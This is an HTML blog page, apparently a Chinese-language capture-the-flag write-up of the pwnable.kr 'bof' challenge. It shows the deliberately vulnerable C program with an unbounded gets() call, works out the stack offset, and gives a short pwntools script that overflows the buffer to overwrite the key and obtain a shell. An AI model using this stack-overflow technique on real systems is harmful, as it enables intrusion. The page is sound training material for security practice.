@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="Prepare题目如下：  下载 bof文件，并打开bof.c： 123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me">
+<meta name="keywords" content="pwnable.kr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Toddler&#39;s Bottle_bof">
+<meta property="og:url" content="http://yoursite.com/2019/03/09/bof/index.html">
+<meta property="og:site_name" content="ConzeHsu&#39;s blog">
+<meta property="og:description" content="Prepare题目如下：  下载 bof文件，并打开bof.c： 123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g0wryel290j30ga0apq33.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g0wuk58v5oj30ih0ew75o.jpg">
+<meta property="og:updated_time" content="2019-03-12T08:17:59.942Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Toddler&#39;s Bottle_bof">
+<meta name="twitter:description" content="Prepare题目如下：  下载 bof文件，并打开bof.c： 123456789101112131415161718#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;string.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void func(int key)&amp;#123;	char overflowme[32];	printf(&quot;overflow me">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/mw690/007c8ISGly1g0wryel290j30ga0apq33.jpg">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>Toddler&#39;s Bottle_bof</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2019/03/12/flag/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2019/03/09/collision/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous</span>
+      <span id="i-next" class="info" style="display:none;">Next</span>
+      <span id="i-top" class="info" style="display:none;">Top</span>
+      <span id="i-share" class="info" style="display:none;">Share</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/09/bof/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/09/bof/&text=Toddler&#39;s Bottle_bof"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/09/bof/&title=Toddler&#39;s Bottle_bof"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Prepare"><span class="toc-number">1.</span> <span class="toc-text">Prepare</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyses"><span class="toc-number">2.</span> <span class="toc-text">Analyses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">Pwn</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        Toddler&#39;s Bottle_bof
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">ConzeHsu's blog</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-03-09T11:34:45.000Z" itemprop="datePublished">2019-03-09</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/pwnable-kr/">pwnable.kr</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="Prepare"><a href="#Prepare" class="headerlink" title="Prepare"></a>Prepare</h2><p>题目如下：</p>
+<p><img src="http://ww1.sinaimg.cn/mw690/007c8ISGly1g0wryel290j30ga0apq33.jpg" alt=""></p>
+<p>下载 <code>bof</code>文件，并打开<code>bof.c</code>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">	gets(overflowme);	<span class="comment">// smash me!</span></span><br><span class="line">	<span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">		system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	func(<span class="number">0xdeadbeef</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h2 id="Analyses"><a href="#Analyses" class="headerlink" title="Analyses"></a>Analyses</h2><p>一直动态调试到<code>lea eax，[ebp-0x2c]</code>,发现把我们输入的参数放在了<code>ebp-0x2c</code>处，而在后面要求比较<code>ebp+0x8</code>所指的值，所以我们需要覆盖到<code>ebp+0x8</code>，然后在此位置构造出<code>0xcafebabe</code>即可。</p>
+<p><img src="http://ww1.sinaimg.cn/mw690/007c8ISGly1g0wuk58v5oj30ih0ew75o.jpg" alt=""></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>我们使用 <code>pwntool</code>来构造我们的脚本，（9000端口目前已经关了）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">conn =remote(<span class="string">'pwnable.kr'</span>,<span class="number">9000</span>)</span><br><span class="line">p = <span class="string">'a'</span>*<span class="number">0x2c</span> + <span class="string">'b'</span>*<span class="number">8</span> + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line">conn.sendline(p)</span><br><span class="line">conn.interative()</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Prepare"><span class="toc-number">1.</span> <span class="toc-text">Prepare</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyses"><span class="toc-number">2.</span> <span class="toc-text">Analyses</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">3.</span> <span class="toc-text">Pwn</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/09/bof/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/09/bof/&text=Toddler&#39;s Bottle_bof"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/09/bof/&title=Toddler&#39;s Bottle_bof"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> Toc</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2019 ConzeHsu
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+</body>
+</html>
+<!-- styles -->
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+<!-- jquery -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+    <script type="text/javascript">
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?72858d4dd5377337e085cc97ce6290a4";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+
+<!-- Disqus Comments -->
+
+
